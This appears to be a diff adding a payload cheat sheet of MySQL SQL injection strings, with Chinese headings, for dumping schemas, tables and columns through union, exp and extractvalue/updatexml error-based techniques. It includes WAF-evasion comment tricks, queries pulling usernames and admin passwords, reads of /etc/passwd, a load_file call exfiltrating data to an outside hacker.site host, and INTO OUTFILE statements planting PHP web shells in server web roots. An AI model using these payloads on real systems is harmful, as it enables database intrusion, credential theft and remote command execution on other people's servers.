@@ -1,0 +1,157 @@
+爆出数据表名：
+(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
+
+(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))
+
+(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
+
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+
+(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
+
+(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
+
+(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@;=export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
+
+(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)  
+
+(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))  
+
+(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))  
+
+(select 1,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@))  
+
+/*!00008UniOn*/+/*!00008sEleCT*/+0x283129,0x283229,0x283329,0x283429,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),0x283629,0x283729,0x283829,0x283929,0x28313029,0x28313129
+
+-EfE'+/*!00009UniOn*/+/*!00009SelEcT*/+0x31,0x32,0x3c68313e494853414e2053454e43414e3c2f68313e,(/*!00009Select*/+export_set(5,@:=0,(/*!00009select*/+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!00009table_name*/,0x3c6c693e,2),/*!00009column_name*/,0xa3a,2)),@,2))
+
+-2'+/*!50000union*/+select+1,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
+
+ -2'+/*!50000union*/+select+1,/*!50000concat*/(username,0x3a,adminpassword),3,4,0x496873616e2053656e63616e207777772e696873616e2e6e6574,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64+from+admin-- -
+
+-3061'++/*!00004UNION*/+/*!00004SELECT*/+0x31,0x32,0x33,0x34,0x35,0x36,(/*!00004Select*/+export_set(5,@:=0,(/*!00004select*/+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!00004table_name*/,0x3c6c693e,2),/*!
+00004column_name*/,0xa3a,2)),@,2)),0x496873616e2053656e63616e,0x39,0x3130,0x3131,0x3132,0x3133,0x3134,0x3135,0x3136,0x3137--+- 
+
+/*!30000union all select (select distinct concat(0x7e,0x27,unhex(Hex(cast(schema_name as char))),0x27,0x7e) from `information_schema`.schemata limit 10,1)
+
+727+union+select+(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),0x64656465--+-/0x496873616e53656e63616e
+
+11'+aND(/*!22223SELECT*/+0x30783331+/*!22223FROM*/+(/*!22223SELECT*/+cOUNT(*),/*!22223CONCAT*/((/*!22223sELECT*/(/*!22223sELECT*/+/*!22223CONCAT*/(cAST(dATABASE()+aS+/*!22223cHAR*/),0x7e,0x496873616E53656e63616e))+/*!22223fROM*/+iNFORMATION_sCHEMA.tABLES+/*!22223wHERE*/+tABLE_sCHEMA=dATABASE()+lIMIT+0,1),fLOOR(/*!22223rAND*/(0)*2))x+/*!22223fROM*/+iNFORMATION_sCHEMA.tABLES+gROUP+bY+x)a)+/*!22223aNd*/+''='/0x496873616e53656e63616e
+
+15'+aND(/*!00002SelEcT*/+0x30783331+/*!00002frOM*/+(/*!00002SelEcT*/+cOUNT(*),/*!00002cOnCaT*/((/*!00002sELECT*/(/*!00002sELECT*/+/*!00002cOnCaT*/(cAST(dATABASE()+aS+/*!00002cHAR*/),0x7e,0x496873616E53656e63616e))+/*!00002FRoM*/+iNFORMATION_sCHEMA.tABLES+/*!00002wHERE*/+tABLE_sCHEMA=dATABASE()+lIMIT+0,1),fLOOR(/*!00002rAND*/(0)*2))x+/*!00002FRoM*/+iNFORMATION_sCHEMA.tABLES+gROUP+bY+x)a)+/*!00002aNd*/+''='/0x496873616e53656e63616e
+
+'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
+
+union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
+
+-551++/*!13337UNION*/+/*!13337SELECT*/+1,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),3,4,5,6,7,8,9--+-
+
+nome=') UNION ALL SELECT NULL,NULL,NULL,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+ 
+nome=') AND ROW(3,6)>(SELECT COUNT(*),CONCAT(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(SELECT (ELT(66=66,1))),FLOOR(RAND(0)*2))x FROM (SELECT 66 UNION SELECT 7030 UNION SELECT 4751 UNION SELECT 1310)a GROUP BY x)-- Efe
+
+nome=') UNION ALL SELECT NULL,NULL,NULL,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+            
+'+union+select+1,load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)),3---
+
+'or!(select*from(selectload_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)))x)-~0---
+
+or exp(~(select*from(select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)))a))---
+
+select `4` from (select 1,2,3,4,5,6 union select * from users)redforce;
+
+extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
+
+(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x))
+
+(/*!01111SELECT*/(@x)/*!01111FROM*/(/*!01111SELECT*/(@x:=0x00),(@NR:=0),(/*!01111SELECT*/(0)/*!01111FROM*/(INFORMATION_SCHEMA.TABLES)/*!01111WHERE*/(TABLE_SCHEMA!=0x696e116f726d6174696f6e5f736368656d61)/*!01111AND*/(0x00)IN(@x:=/*!01111CONCAT*/(@x,/*!01111LPAD*/(@NR:=@NR%1,4,0x30),0x3a20,table_name,0x3c62723e))))x)
+
+
+#exp语句
+得到表名：
+
+select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));
+
+得到列名：
+
+select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));
+
+select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));
+
+exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))
+
+' or exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))-- -&Submit=Submit#
+
+0x04 读取文件
+你可以通过load_file()函数来读取文件，但作者发现有13行的限制，该语句也可以在BIGINT overflow injections中使用。
+select exp(~(select*from(select load_file('/etc/passwd'))a));
+
+
+
+
+#XPATH注入
+and extractvalue(0x0a,concat(0x0a,(select database())))--
+and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))--
+and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)))--
+and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))--
+
+AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
+
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
+
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
+
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
+
+AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
+
+
+
+and updatexml(null,concat(0x3a,(0x0a,(select database()))),null)--
+and updatexml(null,concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)--
+and updatexml(null,concat(0x3a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)),null)--
+and updatexml(null,concat(0x3a,(select count(username,0x3a,password) from users limit 0,1)),null)--
+
+AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)--+
+
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
+
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
+
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
+
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
+
+' and updatexml(null,concat(0x0a,version()),null)-- -
+
+' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
+
+# 查数据表
+' and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'),3) %23
+' or updatexml/*&password=1*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1) or'
+
+# 查字段
+?id=1' and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag2'),'~'),3) %23
+ 
+# 查数据
+?id=1' and updatexml(1,concat('~',(select flag2 from flag2),'~'),3) %23
+
+
+
+
+
+
+
+
+#读文件
+' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+SELECT * FROM mytable INTO dumpfile '/tmp/somefile'
+
+#写shell
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
+SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>
+-1 UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
+UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
+union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
+SELECT "<? echo passthru($_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php'
+
